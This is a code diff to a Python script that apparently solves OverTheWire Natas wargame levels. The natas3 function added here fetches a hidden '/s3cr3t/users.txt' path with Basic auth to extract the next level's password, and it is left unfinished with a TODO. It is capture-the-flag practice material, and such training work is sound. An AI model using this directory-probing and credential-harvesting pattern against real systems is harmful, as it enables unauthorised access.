@@ -70,18 +70,29 @@ def natas2(natas2Password):
     userPassword = ''
     print('[+] Logging into Natas 2 [+]')
     fileContent = requests.get(url, allow_redirects=True, headers=headers)
-    open('natas2.txt', 'wb').write(fileContent.content)
-    with open('natas2.txt', 'r') as file:
+    open('natas2.tmp', 'wb').write(fileContent.content)
+    with open('natas2.tmp', 'r') as file:
         for line in file:
             if userToMatch in line:
                 userPassword = line.replace('natas3:', '')
                 break
     print('Password for next level is: ' + userPassword)
-    os.remove('natas2.txt')
+    os.remove('natas2.tmp')
     return(userPassword)
 
 def natas3(natas3Password):
-
+    url = 'http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt'
+    username = 'natas3'
+    auth_64 = encodeCreds(username, natas3Password)
+    headers = {
+        'Authorization': 'Basic ' + auth_64
+    }
+    userToMatch = 'natas4'
+    userPassword = ''
+    print('[+] Logging into Natas 3 [+]')
+    fileContent = requests.get(url, allow_redirects=True, headers=headers)
+    open('natas3.tmp', 'wb')
+    #TODO FINISH NATAS3
     return()
 
 def main():
